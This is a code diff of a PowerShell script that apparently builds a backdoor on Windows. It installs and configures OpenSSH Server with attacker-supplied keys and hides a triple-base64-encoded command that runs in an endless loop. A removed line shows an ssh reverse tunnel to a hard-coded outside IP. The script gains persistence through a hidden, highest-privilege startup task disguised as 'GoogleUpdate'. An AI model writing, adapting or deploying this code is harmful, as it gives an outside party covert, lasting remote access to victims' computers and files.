@@ -1,8 +1,5 @@
-﻿#$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-#Register-ScheduledTask -Xml $xml -TaskName "GoogleUpdate" -User $currentUser -Force
-
-#$sc = 
-#@'
+﻿$sc =
+@'
 function installSshd 
 {
     $status_install = Get-WindowsCapability -Online -Name "OpenSSH.Server~~~~0.0.1.0"
@@ -139,7 +136,7 @@ function createAuthorized_key #pour guest et admin
 
 Function configSSHD_config
 { 
-    $a = @"
+    $a = @"   
 AuthorizedKeysFile	$Global:contentDirectory/authorized_keys
 PasswordAuthentication no
 Subsystem	sftp	sftp-server.exe
@@ -151,11 +148,11 @@ AuthorizedKeysFile $Global:contentDirectory/administrators_authorized_keys"
     New-Item -ItemType File -Path $pathConfigSSHD -Value $a -Force
 }
 
-$C = 'WXpOT2IwbERNWFpKUTBwVVpFaEtjRmt6VWtsaU0wNHdVekpXTlZFeWFHeFpNblJ3WW0xaloySnRPR2xKUjJReFltNU9hRkZFYTNkTWFrVjNUMU0wZVUxNmEzVk5lazFuVEZaSlowNXFXVEpPYW5CellqSk9hR0pIYUhaak0xRTJUV3BKWjB4V1NXZE9hbGt5VG5wd2MySXlUbWhpUjJoMll6TlJOazlFUVdkTVYydG5TV2xTYkdKdVdUWlVSVGxFVVZWNFFsVkdRa1ZSVmxKQ1RESk9kbUp1VW14aWJsRjJZVmRTWm1OdVRtaEpaejA5'
+$C = 'WXpOT2IwbERNWFpKUms0d1kyMXNhbVJGYUhaak0xSk1XbGhzUkdGSFZtcGhNbXgxV25veGRXSjVRbTVrVnpWNldWVkJOVTFETkhoTlJHdDFUV3BOTlV4cVRYcEpRekYzU1VSWk0wNTZZMmRNVmtsblRtcFpNazVxY0hOaU1rNW9Za2RvZG1NelVUWk5ha2xuVEZkclowbHBVbXhpYmxrMlZFVTVSRkZWZUVKVlJrSkZVVlpTUWt3eVRuWmlibEpzWW01UmRtRlhVbVpqYms1b1NXYzlQUT09'
 
 for ($i = 0; $i -lt 3; $i++) 
 { $C = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($C)) }
-#ssh -o "StrictHostKeyChecking no" gunsa@90.109.239.33 -R 6666:localhost:22 -R 6667:localhost:80 -i "$env:LOCALAPPDATA/content/id_rsa"
+
 installSshd
 createPrivateKeyOnRemote
 createAuthorized_key
@@ -165,54 +162,25 @@ start-job -Name "rebootSSHD" -ScriptBlock {Restart-Service -Name sshd}
 Wait-Job -Name "rebootSSHD"
 Start-Sleep -Seconds 3 
 
+While ($true)
+{
+  Remove-Item -Path "$env:USERPROFILE/.ssh/known_hosts" -Force  
+  iex $C
+  Start-Sleep -Seconds 60
+}
+'@ | Out-File -FilePath "$env:LOCALAPPDATA/content/SC.ps1" -Encoding utf8 -Force
 
-Start-Process -WindowStyle Hidden -FilePath powershell -ArgumentList "-C iex -C '$C'"
-#'@ | Out-File -FilePath "$env:LOCALAPPDATA/content/SC.ps1" -Encoding utf8 -Force
+$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 
-<#
-$xml = @"
-<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo>
-    <Date>2023-06-22T12:04:36.3993155</Date>
-    <Author>DESKTOP-TV94KT0\gunsa</Author>
-    <URI>\test</URI>
-  </RegistrationInfo>
-  <Triggers />
-  <Principals>
-    <Principal id="Author">
-      <UserId>S-1-5-21-1218715442-157715563-3366828991-1001</UserId>
-      <LogonType>InteractiveToken</LogonType>
-      <RunLevel>LeastPrivilege</RunLevel>
-    </Principal>
-  </Principals>
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
-    <AllowHardTerminate>true</AllowHardTerminate>
-    <StartWhenAvailable>false</StartWhenAvailable>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-    <IdleSettings>
-      <StopOnIdleEnd>true</StopOnIdleEnd>
-      <RestartOnIdle>false</RestartOnIdle>
-    </IdleSettings>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-    <Hidden>false</Hidden>
-    <RunOnlyIfIdle>false</RunOnlyIfIdle>
-    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
-    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
-    <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
-    <Priority>7</Priority>
-  </Settings>
-  <Actions Context="Author">
-    <Exec>
-      <Command>cmd</Command>
-      <Arguments>/C /MIN powershell -F "$env:LOCALAPPDATA\content/SC.ps1"</Arguments>
-    </Exec>
-  </Actions>
-</Task>
-"@
-#>
+function task
+{
+  $settings = New-ScheduledTaskSettingsSet -Hidden
+  $trigger = New-ScheduledTaskTrigger -AtStartup
+  $principal = New-ScheduledTaskPrincipal -UserId "$currentUser" -RunLevel Highest
+  $actions = New-ScheduledTaskAction -Execute powershell -Argument '-WindowStyle Hidden -F "%localappdata%\content/SC.ps1"'
+  $task = New-ScheduledTask -Action $actions -Principal $principal -Trigger $trigger -Settings $settings
+
+  Register-ScheduledTask 'GoogleUpdate' -InputObject $task -User "$currentUser" -Force
+  Start-ScheduledTask 'GoogleUpdate'
+}
+task
